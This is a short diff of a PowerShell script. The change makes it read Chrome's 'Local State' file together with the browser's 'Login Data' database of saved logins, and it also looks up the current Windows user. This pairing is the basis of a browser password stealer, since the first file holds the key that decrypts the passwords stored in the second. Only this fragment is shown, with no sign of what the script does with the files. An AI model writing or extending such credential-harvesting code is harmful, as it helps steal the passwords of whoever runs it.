@@ -2,7 +2,7 @@
 # Specify the path to the Local State file
 $paths = @(
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State",
-    "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Login Data"
 )
 function Get-CurrentUser {
     $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
